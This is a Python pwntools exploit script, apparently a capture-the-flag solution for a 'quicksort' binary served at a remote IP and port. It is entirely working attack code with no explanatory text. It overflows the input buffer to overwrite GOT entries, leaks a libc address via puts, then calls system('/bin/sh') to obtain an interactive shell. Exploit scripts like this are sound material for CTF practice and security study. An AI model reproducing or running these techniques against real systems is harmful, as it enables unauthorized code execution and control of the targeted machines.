#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>
from pwn import *
context.log_level="debug"
pwn_file="./quicksort"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("34.92.96.238", 10000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

ret = 0x80489C8
r.sendlineafter("how many numbers do you want to sort?\n",'3')
r.sendlineafter("number:",'1')

original_plt_table = [0x080484f6,  0x08048506, 0x08048516,0x08048526,0x8048530, 0x08048546,0x08048556]
plt_table = [0x080484f6,  0x08048506, elf.plt['puts'] ,0x08048526,0x8048530,ret, 0x08048556 ]

### fill got table
payload = 'd'*0x10 +p32(9) +p32(0xffffffff) + p32(0) + p32(elf.got['printf'])
r.sendlineafter("number:",payload)
for plt in plt_table:
   r.sendlineafter("number:", str(plt))

sort_func = 0x8048816
safe_ptr = 0x804A040
payload = 'd'*0x10 +p32(1) + p32(0) + p32(0) + p32(safe_ptr) 
payload+= 'a'*0x10 + p32(elf.plt['puts']) + p32(sort_func) + p32(elf.got['atoi'])
debug()
r.sendlineafter("number:",payload)

r.recvuntil("Here is the result:\n")
r.recvline()
r.recvline()

addr_on_libc = r.recv(4)
libc.address = u32(addr_on_libc)  - libc.sym['atoi']
info('libc.address: %16x', libc.address)
binsh = list(libc.search("/bin/sh"))[0]
system = libc.sym['system']

r.sendlineafter("how many numbers do you want to sort?\n",'3')
payload = 'd'*0x10 +p32(1) + p32(0) + p32(0) + p32(safe_ptr)
payload+= 'a'*0x10 + p32(system) + p32(0) + p32(binsh)
r.sendlineafter("number:", payload)

r.interactive()
